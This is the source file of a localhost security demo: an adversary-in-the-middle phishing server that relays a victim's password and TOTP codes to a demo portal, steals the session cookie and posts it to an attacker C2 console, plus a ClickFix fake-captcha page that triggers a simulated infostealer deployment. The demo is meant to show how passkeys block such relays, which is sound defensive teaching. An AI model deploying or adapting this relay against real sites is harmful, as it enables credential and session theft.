"""Phishing site — adversary-in-the-middle (AiTM) simulation.

Replica of the Northwind login page. Relays credentials to the real portal,
steals the session cookie, and forwards it to the attacker C2 console.

The WebAuthn relay attempt FAILS BY DESIGN: a phishing origin cannot request
credentials for the portal's RP ID, and assertions signed on the phishing
origin are rejected by the portal's origin verification. This is exactly how
YubiKeys/passkeys defeat AiTM phishing in production.

Also serves a 'ClickFix' fake-captcha page that simulates tricking the user
into running a payload (simulated — see /a).
"""
from __future__ import annotations

import sys
from pathlib import Path

_HERE = Path(__file__).resolve().parent
for _p in (_HERE, _HERE.parent):
    if str(_p) not in sys.path:
        sys.path.insert(0, str(_p))

import httpx
import uvicorn
from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from common import config
from common.util import ROOT, now_iso, post_json

templates = Jinja2Templates(directory=_HERE / "templates")

app = FastAPI(title="Phish (AiTM simulation)")
app.mount("/theme", StaticFiles(directory=ROOT / "common" / "static"), name="theme")

# state per victim email (simple demo store)
_victims: dict[str, dict] = {}


def _report_to_c2(payload: dict) -> None:
    post_json(f"{config.C2_URL}/api/loot", payload, timeout=3.0)


def _relay_client() -> httpx.Client:
    return httpx.Client(base_url=config.PORTAL_URL, timeout=10.0)


@app.get("/healthz")
def healthz():
    return {"ok": True, "service": "phish"}


@app.get("/", response_class=HTMLResponse)
@app.get("/login", response_class=HTMLResponse)
def login_page(request: Request, target: str = ""):
    return templates.TemplateResponse(
        request,
        "login.html",
        {
            "request": request,
            "target": target,
            "portal_origin": config.PORTAL_ORIGIN,
            "error": None,
        },
    )


@app.post("/login")
def login(request: Request, email: str = Form(...), password: str = Form(...)):
    """Relay step 1: credentials."""
    victim = _victims.setdefault(email, {})
    ua = request.headers.get("user-agent")

    with _relay_client() as c:
        r = c.post(
            "/login",
            data={"email": email, "password": password},
            headers={"user-agent": ua or ""},
            cookies=victim.get("cookies", {}),
        )
    data = r.json()

    # Capture any session cookie the relay acquired
    if r.cookies:
        victim["cookies"] = dict(r.cookies)
        _report_to_c2(
            {
                "kind": "session",
                "user": email,
                "cookie": victim["cookies"].get("nw_session"),
                "via": "password (no MFA)",
                "ts": now_iso(),
            }
        )

    if data.get("stage") == "done":
        return JSONResponse({"ok": True, "next": "/done"})

    if data.get("stage") == "totp":
        return JSONResponse({"ok": True, "next": "/totp"})

    if data.get("stage") == "passkey":
        # Relay the real WebAuthn challenge — the victim's browser will refuse
        # to use portal.localhost credentials from the phishing origin.
        with _relay_client() as c:
            r = c.get(
                "/api/webauthn/authenticate/options",
                params={"email": email},
                headers={"user-agent": ua or ""},
                cookies=victim.get("cookies", {}),
            )
        opts = r.json()
        _report_to_c2(
            {
                "kind": "webauthn_relay_started",
                "user": email,
                "ts": now_iso(),
                "note": "Relaying portal's WebAuthn challenge to victim browser",
                "challenge": opts.get("challenge"),
            }
        )
        return JSONResponse(
            {"ok": True, "next": "/webauthn", "challenge": opts.get("challenge")}
        )

    return JSONResponse(
        {"ok": False, "error": data.get("error", "login failed")}, status_code=400
    )


@app.get("/totp", response_class=HTMLResponse)
def totp_page(request: Request):
    return templates.TemplateResponse(request, "totp.html", {"request": request})


@app.post("/totp")
def totp(request: Request, email: str = Form(...), code: str = Form(...)):
    victim = _victims.setdefault(email, {})
    ua = request.headers.get("user-agent")
    with _relay_client() as c:
        r = c.post(
            "/login/totp",
            data={"email": email, "code": code},
            headers={"user-agent": ua or ""},
            cookies=victim.get("cookies", {}),
        )
    data = r.json()
    if r.cookies:
        victim["cookies"] = dict(r.cookies)
        _report_to_c2(
            {
                "kind": "session",
                "user": email,
                "cookie": victim["cookies"].get("nw_session"),
                "via": "TOTP relayed in real time (AiTM)",
                "ts": now_iso(),
            }
        )
    if data.get("ok"):
        return JSONResponse({"ok": True, "next": "/done"})
    return JSONResponse({"ok": False, "error": data.get("error")}, status_code=400)


@app.get("/webauthn", response_class=HTMLResponse)
def webauthn_page(request: Request, email: str = ""):
    return templates.TemplateResponse(
        request, "webauthn.html", {"request": request, "email": email}
    )


@app.post("/webauthn/failed")
async def webauthn_failed(request: Request):
    """Victim's browser refused the ceremony (origin binding). Report the block."""
    body = await request.json()
    email = body.get("email", "")
    error = str(body.get("error", ""))[:300]
    _report_to_c2(
        {
            "kind": "webauthn_blocked",
            "user": email,
            "error": error,
            "via": "WebAuthn origin binding — browser refused ceremony on phishing origin",
            "ts": now_iso(),
        }
    )
    return JSONResponse({"ok": True})


@app.get("/done", response_class=HTMLResponse)
def done_page(request: Request):
    return templates.TemplateResponse(request, "done.html", {"request": request})


# ------------------------- ClickFix ----------------------------------------
@app.get("/clickfix", response_class=HTMLResponse)
def clickfix_page(request: Request):
    return templates.TemplateResponse(
        request, "clickfix.html", {"request": request, "phish_origin": config.PHISH_ORIGIN}
    )


@app.get("/a")
def payload_text():
    """The 'payload' the ClickFix command references. Inert by design."""
    return {
        "ok": True,
        "note": "SIMULATED PAYLOAD — no-op. The real demo payload is deployed by the "
        "endpoint simulator, not by this URL.",
    }


@app.post("/api/clickfix/deploy")
async def clickfix_deploy(request: Request):
    """'Victim ran the command' — stage the infostealer on the endpoint sim."""
    try:
        body = await request.json()
    except Exception:  # noqa: BLE001
        body = {}
    user = body.get("user", "alex@northwind.demo")
    r = post_json(
        f"{config.C2_URL}/api/clickfix/deploy",
        {"user": user, "origin": "clickfix", "ts": now_iso()},
        timeout=6.0,
    )
    if r and r.get("ok"):
        return JSONResponse({"ok": True})
    return JSONResponse(
        {"ok": False, "error": (r or {}).get("error", "deploy failed")}, status_code=502
    )


if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=config.PHISH_PORT, log_level="warning")
